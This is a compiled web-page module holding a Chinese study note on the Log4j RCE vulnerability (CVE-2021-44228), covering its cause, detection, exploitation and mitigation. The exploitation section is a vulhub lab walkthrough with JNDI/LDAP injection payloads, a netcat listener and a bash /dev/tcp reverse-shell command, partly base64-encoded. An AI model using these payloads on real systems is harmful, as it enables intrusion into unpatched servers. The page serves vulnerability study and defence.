import{_ as o,W as l,X as r,Y as a,Z as s,a0 as t,a1 as e,C as i}from"./framework-b6a07282.js";const c="/assets/1-5b1e2e89.jpg",d="/assets/2-1e40c2ba.jpg",p="/assets/3-3689f023.jpg",h="/assets/4-eb8b5ca2.jpg",u="/assets/5-a484e50c.jpg",v={},b=e('<h2 id="log4j漏洞" tabindex="-1"><a class="header-anchor" href="#log4j漏洞" aria-hidden="true">#</a> Log4j漏洞</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>攻击者可通过JNDI注入向log4j2日志记录器发送恶意字符串，从而触发远程代码执行。</li><li>CVE-2021-44228（Log4j RCE漏洞）</li></ul><p>CVE-2021-44228 远程代码执行漏洞 →2.15.0修复</p><p>CVE-2021-45046 拒绝服务Dos漏洞 →2.16.0修复</p><p>CVE-2021-45105 拒绝服务Dos漏洞 →2.17.0修复</p><p>CVE-2021-44832 远程代码执行漏洞 →2.17.1修复</p><h4 id="cve-2021-44228-log4j-rce漏洞-影响范围" tabindex="-1"><a class="header-anchor" href="#cve-2021-44228-log4j-rce漏洞-影响范围" aria-hidden="true">#</a> CVE-2021-44228（Log4j RCE漏洞）影响范围</h4><ol><li>使用了log4j的组件，并且版本在2.x &lt;= 2.14.1，且JDK版本小于8u191、7u201、6u211</li></ol><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><h4 id="cve-2021-44228-log4j-rce漏洞" tabindex="-1"><a class="header-anchor" href="#cve-2021-44228-log4j-rce漏洞" aria-hidden="true">#</a> CVE-2021-44228（Log4j RCE漏洞）</h4><ul><li>这个漏洞是由于Log4j2在处理日志消息时，未对字符合法性进行严格的限制。如果遇到以${jndi:}开头的字符串，会将其作为JNDI引用进行解析，并调用lookup方法访问远程服务。攻击者可以准备好恶意代码并通过构造恶意的JNDI引用，指向自己控制的RMI或LDAP服务器，从而触发JNDI注入并执行任意代码。</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><h4 id="cve-2021-44228-log4j-rce漏洞-1" tabindex="-1"><a class="header-anchor" href="#cve-2021-44228-log4j-rce漏洞-1" aria-hidden="true">#</a> CVE-2021-44228（Log4j RCE漏洞）</h4><ol><li>使用POC</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>POC:<span class="token variable">${jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>${sys<span class="token operator">:</span>java.version}</span>.n1ow9e.dnslog.cn<span class="token punctuation">}</span>\n\n<span class="token number">1</span>.漏洞探测\nhttp://192.168.1.100/solr/admin/cores?action<span class="token operator">=</span><span class="token variable">${jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>${sys<span class="token operator">:</span>java.version}</span>.vay3pb.dnslog.cn<span class="token punctuation">}</span>\n<span class="token comment">#如果dnslog有返回java的版本即存在漏洞。</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="'+c+'">',17),j={start:"2"},g=a("li",null,"排本排查，Apache log4j2 2.0-2.15.0.rc1",-1),m={href:"http://dnslog.cn",target:"_blank",rel:"noopener noreferrer"},k=a("li",null,"使用工具扫描 log4j-local-check、allScanner",-1),_=a("li",null,"检查日志中是否存在相关堆栈报错，堆栈里是否有 JndiLookup、ldapURLContext、 getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。",-1),I=e(`<h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><h4 id="cve-2021-44228-log4j-rce漏洞-2" tabindex="-1"><a class="header-anchor" href="#cve-2021-44228-log4j-rce漏洞-2" aria-hidden="true">#</a> CVE-2021-44228（Log4j RCE漏洞）</h4><ul><li>远程代码执行（RCE）</li></ul><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h4 id="cev-2021-22448复现" tabindex="-1"><a class="header-anchor" href="#cev-2021-22448复现" aria-hidden="true">#</a> CEV-2021-22448复现</h4><h5 id="vulhub复现" tabindex="-1"><a class="header-anchor" href="#vulhub复现" aria-hidden="true">#</a> vulhub复现</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.kail开启端口监听
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">4444</span>

<span class="token number">2</span>.使用JNDI-Injection-Exploit利用漏洞,开启ldap或RMI服务并注入恶意代码。
<span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">&quot;反弹shell的IP&quot;</span> <span class="token parameter variable">-A</span> <span class="token string">&quot;准备成为LDAP或RMI服务器的IP（公网）&quot;</span>  
<span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">&quot;bash -c {echo,base64编码反弹shell}|{base64,-d}|{bash,-i}&quot;</span> <span class="token parameter variable">-A</span> <span class="token string">&quot;LDAP或RMI服务器的IP&quot;</span>
<span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">&quot;bash -c {echo,bash -i &gt;&amp;/dev/tcp/192.168.1.160/4444 0&gt;&amp;1}|{base64,-d}|{bash,-i}&quot;</span> <span class="token parameter variable">-A</span> <span class="token string">&quot;192.168.1.109&quot;</span>
<span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">&quot;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMS4xNjAvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}&quot;</span> <span class="token parameter variable">-A</span> <span class="token string">&quot;192.168.1.109&quot;</span> <span class="token comment">#命令须被base64加密</span>

<span class="token number">3</span>.将JNDI-Injection-Exploit生成的payload去访问存在log4j漏洞的服务器
http://192.168.1.100/solr/admin/cores?action<span class="token operator">=</span><span class="token variable">\${jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>192.168.1.109<span class="token operator">:</span>1389<span class="token operator">/</span>zhcsmu}</span>

<span class="token number">4</span>.目标服务器成功上线。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><table><thead><tr><th>描述</th><th>效果</th></tr></thead><tbody><tr><td>1.kail开启端口监听</td><td><img src="`+d+'"></td></tr><tr><td>2.使用JNDI-Injection-Exploit利用漏洞,开启ldap或RMI服务并注入恶意代码。</td><td><img src="'+p+'"></td></tr><tr><td>3.将JNDI-Injection-Exploit生成的payload去访问存在log4j漏洞的服务器</td><td><img src="'+h+'"></td></tr><tr><td>4.目标服务器上线</td><td><img src="'+u+'"></td></tr></tbody></table><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><h4 id="cve-2021-44228-log4j-rce漏洞-3" tabindex="-1"><a class="header-anchor" href="#cve-2021-44228-log4j-rce漏洞-3" aria-hidden="true">#</a> CVE-2021-44228（Log4j RCE漏洞）</h4><ol><li>禁止用户请求参数出现攻击关键字 。</li><li>禁止lookup方法下载远程文件（命名引用）。</li><li>禁止Log4j的应用连接外网 。</li><li>禁止Log4j使用lookup方法。</li><li>从Log4j jar包中中删除lookup 2.10以下。</li><li>将Log4j框架升级到最新版本。</li><li>使用WAF、RASP。</li></ol><p>临时方案：</p><ol><li><p>升级JDK</p></li><li><p>修改Log4j配置 设置参数：log4j2.formatMsgNoLookups=True 修改JVM参数：-Dlog4j2.formatMsgNoLookups=true 系统环境变量：FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为 true 禁止使用了 Log4j2 的应用所在服务器外</p></li><li><p>删除JndiLookup.class</p></li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>暂无</li></ul><h3 id="补充知识" tabindex="-1"><a class="header-anchor" href="#补充知识" aria-hidden="true">#</a> 补充知识</h3><h4 id="log4j" tabindex="-1"><a class="header-anchor" href="#log4j" aria-hidden="true">#</a> Log4j</h4><ul><li>Log4j是一个开源的日志记录组件，用于在Java程序中输出和管理日志信息。Log4j可以控制日志信息的输出目的地、格式和级别，通过一个配置文件就可以灵活地配置，而不需要修改代码。Log4j有多个版本，最新的是Log4j2，它提供了更好的性能和功能.</li></ul><h4 id="jndi" tabindex="-1"><a class="header-anchor" href="#jndi" aria-hidden="true">#</a> JNDI</h4><ul><li>JNDI是Java命名和目录接口（Java Naming and Directory Interface的缩写），JNDI是一个用于访问不同类型的命名和目录服务的API。例如DNS、LDAP、RMI等。</li></ul><h4 id="jndi注入" tabindex="-1"><a class="header-anchor" href="#jndi注入" aria-hidden="true">#</a> JNDI注入</h4><ul><li>JNDI注入是一种利用Java命名和目录接口（JNDI）的特性来执行远程代码的攻击手法。JNDI注入的原理是通过控制JNDI调用的lookup参数，使其指向一个恶意的远程服务，从而下载并执行恶意代码。</li></ul>',22);function x(f,N){const n=i("ExternalLinkIcon");return l(),r("div",null,[b,a("ol",j,[g,a("li",null,[s("可以通过检查日志中是否存在“jndi:ldap://” 、 “jndi:rmi” 、 “"),a("a",m,[s("dnslog.cn"),t(n)]),s("”等字符来发现可能的攻击行为。")]),k,_]),I])}const E=o(v,[["render",x],["__file","Log4j漏洞.html.vue"]]);export{E as default};
